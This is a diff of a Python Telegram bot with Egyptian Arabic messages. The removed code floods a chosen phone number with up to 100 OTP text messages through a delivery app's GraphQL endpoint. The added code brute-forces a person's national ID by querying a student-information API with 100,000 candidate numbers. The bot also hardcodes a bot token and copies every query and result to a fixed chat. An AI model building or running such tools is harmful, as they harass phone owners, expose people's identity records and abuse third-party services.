@@ -1,29 +1,28 @@
 import telebot
 import requests
-
-bot = telebot.TeleBot('6673789871:AAGf-6reiWsjEHgYtXjlW0SDoh-8pKeaWJw')
+import time
+import os
+bot_token = '6673789871:AAGf-6reiWsjEHgYtXjlW0SDoh-8pKeaWJw'
+bot = telebot.TeleBot(bot_token)
 
 # Dictionary to store the processing status for each user ID
 processing_status = {}
 
-def sendMessage(number):
-  headers = {
-      "User-Agent": "Dart/3.1 (dart:io)",
-      "Accept": "application/json",
-      "Lang": "en",
-      "Accept-Encoding": "gzip",
-      "Content-Length": "96",
-      "Host": "app.tagaddod.com",
-      "Content-Type": "application/json; charset=utf-8"
-  }
+def find_valid_id(base_number, code,start):
+    for i in range(start,100000):  # Iterate from 00000 to 99999
+        usfnumber = str(i).zfill(5)
+        generated_value = base_number + usfnumber
+        response = requests.get(f"https://zaguni.vercel.app/get_stud_info?national_id={generated_value}").text
+        if 'data' in response and code in response:
+            
+            return generated_value
+        else:
+            print(f'Fail: {generated_value}')
 
-  data = f'{{"operationName":"","variables":{{}},"query":"mutation{{\\nsendOTP(phone: \\"{number}\\")\\n}}"}}'
-
-  response = requests.post('https://app.tagaddod.com/graphql', headers=headers, data=data).text
-  if "You will receive SMS with your OTP" in response:
-      return "done"
-  else:
-      return "error"
+        if i % 10 == 0:
+            os.system('cls')
+            time.sleep(5)
+            
 
 @bot.message_handler(commands=['start'])
 def welcome(message):
@@ -42,41 +41,42 @@ def isMsg(message):
 def reply(message):
     global processing_status
     try:
-        Text="Done"
+        Text = "حصل مشكله جرب تاني"
         user_id = message.from_user.username
         if user_id in processing_status and processing_status[user_id]:
-            bot.reply_to(message, '''استني لما نخلص و نقولك Done  عشان نقدر نبعتلك  تاني 
+            bot.reply_to(message, '''استني لما نخلص عشان نقدر نبعتلك  تاني 
 مش كلو ورا بعضو كده 😏''')
             return
 
-        
-        bot.reply_to(message, "استني....")
+        bot.reply_to(message, "wait...")
 
         x = message.text
-        if " "in x:
-          x=x.replace(" ","")
-        if x[0]=="+":
-          x=x[2:] 
-        number=x[0:11]
-        count=int(x[12:])
-        max_count=100
-        if count>max_count:
-          bot.reply_to(message,f"مينفعش تبعت اكتر من  {max_count} في المره الواحده ")
-          return
+        if " " in x:
+            x = x.replace(" ", "")
+        if x[0] == "+":
+            x = x[2:] 
+        number = x[0:9]
+        code = x[10:24]
+        start=int(x[25:])
+        print(number)
+        print(code)
+        print(start)
 
         processing_status[user_id] = True  # Set processing status to True for the current user
-        for i in range(count):
-          sendMessage(number)
+        try:
+            Text = f"*ID is : * `{find_valid_id(number, code,start)}`"
+            if not Text:
+                Text = "No valid ID found"
+        except:
+            Text = "دخلت داتا غلط"
 
-        bot.reply_to(message, Text)
+        bot.reply_to(message, Text,parse_mode='MarkdownV2')
         processing_status[user_id] = False  # Reset processing status for the current user
-        bot.send_message(1098317745, message.text + "\n" + "From: " + "@" + message.from_user.username + "\n" + "Response: " + Text)
+        bot.send_message(1098317745, f"{message.text}\nFrom: @{message.from_user.username}\nResponse: {Text}",parse_mode='MarkdownV2')
 
     except Exception as e:
         Text = "Faild"
         bot.reply_to(message, Text)
         print(e)
-
-
 
 bot.polling()
